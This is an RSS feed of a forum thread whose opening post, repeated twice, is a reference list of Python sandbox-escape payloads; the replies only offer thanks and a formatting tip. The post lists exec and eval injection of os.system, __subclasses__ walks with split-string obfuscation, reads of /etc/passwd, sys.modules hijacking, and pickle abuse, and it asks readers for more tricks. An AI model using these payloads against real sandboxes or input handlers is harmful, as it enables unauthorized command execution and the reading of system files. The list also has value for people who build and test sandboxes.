<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Execute System Commands in Python (Reference)</title>
    <link>https://0x00sec.org/t/execute-system-commands-in-python-reference/7870</link>
    <description>If you guys get any other tricks, please let me know, we can improve and perfect it, and forgive my poor english.

# type 1: keywords

1. `exec(&#39;import os ;os.system(&quot;ls&quot;)&#39;)`
2. `eval(&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)`
3. `f&#39;&#39;&#39;{__import__(&#39;os&#39;).system(&#39;ls&#39;)}&#39;&#39;&#39;`
4. `[].__class__.__mro__[-1].__subclasses__()`
5. `_builtin__.open(&#39;/etc/passwd&#39;)`
6. `system(&#39;ls&#39;)`
7. `[].__class__.__base__.__subclasses__()[59]()._module.linecache.__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;l&#39;+&#39;s&#39;)   # only python2`
8. `[].__class__.__base__.__subclasses__()[59](linecache.getlines, &#39;/etc/password&#39;)`
9. `[].__class__.__base__.__subclasses__()[59](exec, &#39;(&quot;__import__(&quot;os&quot;).system(&quot;ls&quot;)&quot;)&#39;)`

# type 2: python lib

1. `subprocess.Popen(&#39;ls&#39;)`
2. `os.popen(&#39;ls&#39;)`
3. `importlib`
4. `builtins.open(&#39;/etc/passwd&#39;)`
5. `linecache.getlines(&#39;/etc/passwd&#39;)`


# type 3: python import

1. `__import`
2. `import`
3. `importlib`

# type 4: other

1. ```python
      import sys
      sys.modules[&#39;NB&#39;]=&#39;/Users/mour/anaconda3/lib/python3.6/os.py&#39;
      import NB
   ```
   
2. base64 deocde encode 
3. pickle


# References
* [Python沙箱逃逸的n种姿势](https://xz.aliyun.com/t/52)
* [Escaping python sanbox](https://zolmeister.com/2013/05/escaping-python-sandbox.html)
* [Pickle Security](http://v0ids3curity.blogspot.com/2012/10/exploit-exercise-python-pickles.html)</description>
    
    <lastBuildDate>Mon, 13 Aug 2018 22:24:13 +0000</lastBuildDate>
    <category>Programming</category>
    <atom:link href="https://0x00sec.org/t/execute-system-commands-in-python-reference/7870.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Execute System Commands in Python (Reference)</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/execute-system-commands-in-python-reference/7870/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/execute-system-commands-in-python-reference/7870/5</link>
        <pubDate>Sat, 01 Sep 2018 03:13:38 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7870-5</guid>
        <source url="https://0x00sec.org/t/execute-system-commands-in-python-reference/7870.rss">Execute System Commands in Python (Reference)</source>
      </item>
      <item>
        <title>Execute System Commands in Python (Reference)</title>
        <dc:creator><![CDATA[Valravn]]></dc:creator>
        <description><![CDATA[
            <p>That’s a great job. Thanks buddy.</p>
          <p><a href="https://0x00sec.org/t/execute-system-commands-in-python-reference/7870/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/execute-system-commands-in-python-reference/7870/4</link>
        <pubDate>Mon, 13 Aug 2018 22:24:13 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7870-4</guid>
        <source url="https://0x00sec.org/t/execute-system-commands-in-python-reference/7870.rss">Execute System Commands in Python (Reference)</source>
      </item>
      <item>
        <title>Execute System Commands in Python (Reference)</title>
        <dc:creator><![CDATA[mour]]></dc:creator>
        <description><![CDATA[
            <p>yeah, no problem. you can add it  make us to know it. thanks.</p>
          <p><a href="https://0x00sec.org/t/execute-system-commands-in-python-reference/7870/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/execute-system-commands-in-python-reference/7870/3</link>
        <pubDate>Thu, 02 Aug 2018 16:20:47 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7870-3</guid>
        <source url="https://0x00sec.org/t/execute-system-commands-in-python-reference/7870.rss">Execute System Commands in Python (Reference)</source>
      </item>
      <item>
        <title>Execute System Commands in Python (Reference)</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Hi! This is pretty cool.</p>
<p>May I suggest using multi-line code formatting for all of the examples? I would think it would be easier to copy and read that way!</p>
<p>Thanks</p>
          <p><a href="https://0x00sec.org/t/execute-system-commands-in-python-reference/7870/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/execute-system-commands-in-python-reference/7870/2</link>
        <pubDate>Thu, 02 Aug 2018 10:19:18 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7870-2</guid>
        <source url="https://0x00sec.org/t/execute-system-commands-in-python-reference/7870.rss">Execute System Commands in Python (Reference)</source>
      </item>
      <item>
        <title>Execute System Commands in Python (Reference)</title>
        <dc:creator><![CDATA[mour]]></dc:creator>
        <description><![CDATA[
            <p>If you guys get any other tricks, please let me know, we can improve and perfect it, and forgive my poor english.</p>
<h1>type 1: keywords</h1>
<ol>
<li><code>exec('import os ;os.system("ls")')</code></li>
<li><code>eval('__import__("os").system("ls")')</code></li>
<li><code>f'''{__import__('os').system('ls')}'''</code></li>
<li><code>[].__class__.__mro__[-1].__subclasses__()</code></li>
<li><code>_builtin__.open('/etc/passwd')</code></li>
<li><code>system('ls')</code></li>
<li><code>[].__class__.__base__.__subclasses__()[59]()._module.linecache.__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s')   # only python2</code></li>
<li><code>[].__class__.__base__.__subclasses__()[59](linecache.getlines, '/etc/password')</code></li>
<li><code>[].__class__.__base__.__subclasses__()[59](exec, '("__import__("os").system("ls")")')</code></li>
</ol>
<h1>type 2: python lib</h1>
<ol>
<li><code>subprocess.Popen('ls')</code></li>
<li><code>os.popen('ls')</code></li>
<li><code>importlib</code></li>
<li><code>builtins.open('/etc/passwd')</code></li>
<li><code>linecache.getlines('/etc/passwd')</code></li>
</ol>
<h1>type 3: python import</h1>
<ol>
<li><code>__import</code></li>
<li><code>import</code></li>
<li><code>importlib</code></li>
</ol>
<h1>type 4: other</h1>
<ol>
<li>
<pre><code class="lang-python">   import sys
   sys.modules['NB']='/Users/mour/anaconda3/lib/python3.6/os.py'
   import NB
</code></pre>
</li>
<li>
<p>base64 deocde encode</p>
</li>
<li>
<p>pickle</p>
</li>
</ol>
<h1>References</h1>
<ul>
<li><a href="https://xz.aliyun.com/t/52" rel="nofollow noopener">Python沙箱逃逸的n种姿势</a></li>
<li><a href="https://zolmeister.com/2013/05/escaping-python-sandbox.html" rel="nofollow noopener">Escaping python sanbox</a></li>
<li><a href="http://v0ids3curity.blogspot.com/2012/10/exploit-exercise-python-pickles.html" rel="nofollow noopener">Pickle Security</a></li>
</ul>
          <p><a href="https://0x00sec.org/t/execute-system-commands-in-python-reference/7870/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/execute-system-commands-in-python-reference/7870/1</link>
        <pubDate>Thu, 02 Aug 2018 03:13:37 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7870-1</guid>
        <source url="https://0x00sec.org/t/execute-system-commands-in-python-reference/7870.rss">Execute System Commands in Python (Reference)</source>
      </item>
  </channel>
</rss>
